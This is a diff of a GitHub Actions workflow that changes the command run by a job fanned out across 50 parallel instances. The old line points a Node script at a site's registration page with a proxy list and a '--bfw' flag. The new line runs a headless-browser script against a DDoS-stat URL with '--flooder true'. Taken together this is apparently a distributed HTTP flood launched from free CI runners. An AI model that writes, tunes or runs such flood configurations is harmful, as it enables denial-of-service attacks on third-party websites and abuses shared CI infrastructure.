@@ -43,7 +43,7 @@ jobs:
         run: |
           unzip Fc-main.zip
           cd Fc-main
-          node a.js GET https://devbest.com/register/ 4 200 90 proxy.txt --bfw --debug 
+          xvfb-run -a node browser.js https://captcha.dstatbot.win/lnUG5ZdR 700 4 64 m.txt --debug true --flooder true
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
